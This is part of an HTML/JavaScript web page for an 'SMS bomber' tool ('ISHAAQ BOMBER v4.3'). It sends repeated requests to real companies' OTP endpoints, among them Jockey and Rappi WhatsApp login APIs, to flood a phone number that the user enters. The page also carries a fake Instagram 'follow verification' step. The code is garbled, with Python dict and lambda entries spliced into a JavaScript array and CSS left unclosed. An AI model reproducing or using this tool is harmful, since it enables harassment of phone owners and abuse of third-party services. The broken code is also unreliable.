    .india-flag-bg {
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, #FF9933 0%, #FF9933 33%, #FFFFFF 33%, #FFFFFF 66%, #138808 66%, #138808 100%);
      opacity: 0.12;
      animation: flagWave 22s linear infinite;
      background-size: 300% 300%;
    }

    @keyframes flagWave {
      0% { background-position: 0% 50%; }
      100% { background-position: 300% 50%; }
    }

    .ashoka-bg {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 520px;
      height: 520px;
      background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/5/5b/Ashoka_Chakra.svg/1024px-Ashoka_Chakra.svg.png') no-repeat center/contain;
      transform: translate(-50%, -50%);
      animation: ashokaSpin 65s linear infinite;
      opacity: 0.14;
    }

    @keyframes ashokaSpin {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .bg-grid {
      position: absolute;
      inset: 0;
      background-image: linear-gradient(rgba(0,255,170,0.05) 1px, transparent 1px),

      background-size: 60px 60px;
      animation: gridMove 32s linear infinite;
    }

    @keyframes gridMove {
      0% { background-position: 0 0; }
      100% { background-position: 120px 120px; }
    }

    .jet-plane {
      position: fixed;
      width: 110px;
      height: 55px;
      background: url('https://i.ibb.co/0jZfK8K/jet-fighter.png') no-repeat center/contain;
      filter: drop-shadow(0 0 20px #00ffff);
      z-index: 5;
      animation: jetFly linear forwards;
      opacity: 0;
      pointer-events: none;
    }

    @keyframes jetFly {
      0% { opacity: 0; transform: scale(0.6) rotate(-35deg); }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { opacity: 0; transform: scale(1.1) rotate(25deg); }
    }

    .scanline {
      position: fixed;
      top: -100%;
      left: 0;
      width: 100%;
      height: 4px;
      background: linear-gradient(transparent, rgba(0,255,255,0.6), transparent);
      box-shadow: 0 0 25px #00ffff;
      animation: scan 6s linear infinite;
      z-index: 6;
      display: none;

    }

    @keyframes scan {

    },
    {

        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},

    },
      // Add your full list of APIs here...
    ];

    let interval = null;
    let roundCount = 0;
    let totalSuccess = 0;
    let currentPhone = "";
    let isDarkMode = false;

    function log(message, color = "#006633") {
      const logDiv = document.getElementById('log');
      const time = new Date().toLocaleTimeString('en-IN', { hour12: false });
      logDiv.innerHTML += `<span style="color:\( {color}">[ \){time}] ${message}</span><br>`;
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function sendBomb(api, phone) {
      try {
        let url = typeof api.url === 'function' ? api.url(phone) : api.url;
        let body = api.data ? (typeof api.data === 'function' ? api.data(phone) : api.data) : null;

        const options = { method: api.method, headers: api.headers || {}, mode: 'cors' };
        if (body && api.method !== "GET") options.body = body;

        const res = await fetch(url, options);
        if (res.ok) {
          totalSuccess++;
          document.getElementById('successCount').textContent = totalSuccess;
          log(`✅ ${api.name} → SUCCESS`, isDarkMode ? "#00ff88" : "#006633");
        } else {
          log(`⚠️ ${api.name} → ${res.status}`, "#cc7700");
        }
      } catch (e) {
        log(`❌ ${api.name} → FAILED`, "#cc0000");
      }
    }

    function toggleTheme() {
      isDarkMode = !isDarkMode;
      if (isDarkMode) {
        document.body.classList.add('dark');
        document.body.classList.remove('light');
        document.getElementById('themeToggle').textContent = '☀️ Light Mode';
      } else {
        document.body.classList.remove('dark');
        document.body.classList.add('light');
        document.getElementById('themeToggle').textContent = '🌙 Dark Mode';
      }
    }

    function openInstagram() {
      window.open("https://www.instagram.com/yt__editz__x?igsh=ZXljZ3VpaDhza3h6", "_blank");

      const spinner = document.getElementById('verifySpinner');
      const message = document.getElementById('verifyMessage');
      const btn = document.getElementById('verifyBtn');

      spinner.style.display = 'block';
      message.textContent = "Verifying your follow...";
      btn.style.display = 'none';

      setTimeout(() => {
        spinner.style.display = 'none';
        message.innerHTML = '✅ Follow Verified Successfully';
        message.style.color = isDarkMode ? '#00ff88' : '#006633';

        setTimeout(() => {
          document.getElementById('verifyBar').classList.remove('show');
          startActualBombing();
        }, 1400);
      }, 6000);
    }

    function startActualBombing() {
      if (!currentPhone) return;

      document.getElementById('startBtn').style.display = 'none';
      document.getElementById('stopBtn').style.display = 'inline-block';

      document.getElementById('status').innerHTML = `🚀 ATTACKING +91<span style="color:#00cc99">${currentPhone}</span>`;
      document.getElementById('status').style.color = isDarkMode ? "#00ff88" : "#006633";

      log(`🚀 BOMBING STARTED ON +91${currentPhone}`, isDarkMode ? "#ffffff" : "#1a1a1a");

      roundCount = 0;
      totalSuccess = 0;
      document.getElementById('roundCount').textContent = '0';
      document.getElementById('successCount').textContent = '0';

      interval = setInterval(() => {
        roundCount++;
        document.getElementById('roundCount').textContent = roundCount;
        log(`🔥 ROUND ${roundCount} • LAUNCHING ATTACK...`, isDarkMode ? "#00ffff" : "#006633");

        ULTIMATE_APIS.forEach((api, i) => {
          setTimeout(() => sendBomb(api, currentPhone), i * 40);
        });
      }, 3200);
    }

    function handleStart() {
      const phone = document.getElementById('phone').value.trim();

      if (!/^\d{10}$/.test(phone)) {
        alert("❌ Please enter a valid 10 digit Indian number!");
        return;
      }

      currentPhone = phone;

      document.getElementById('verifyBar').classList.add('show');
      document.getElementById('verifySpinner').style.display = 'none';
      document.getElementById('verifyMessage').textContent = "Follow on Instagram to continue";
      document.getElementById('verifyBtn').style.display = 'block';
    }

    function stopBombing() {
      if (interval) clearInterval(interval);
      interval = null;
      document.getElementById('startBtn').style.display = 'inline-block';
      document.getElementById('stopBtn').style.display = 'none';
      document.getElementById('status').innerHTML = `⛔ BOMBING STOPPED`;
      document.getElementById('status').style.color = "#ff3366";
      log("⛔ ATTACK HALTED", "#ff3366");
    }

    function launchJets() {
      const jets = document.querySelectorAll('.jet-plane');
      jets.forEach((jet, i) => {
        jet.style.animation = 'none';
        void jet.offsetWidth;
        const duration = 7 + Math.random() * 5;
        jet.style.animation = `jetFly ${duration}s linear forwards`;
        jet.style.left = `-${15 + i*5}%`;
        jet.style.top = `${10 + i*20}%`;
      });
    }

    window.onload = () => {
      document.getElementById('phone').focus();
      log("🟢 ISHAAQ BOMBER v4.3 LOADED", "#006633");
      launchJets();
      setInterval(launchJets, 13500);
    };
  </script>
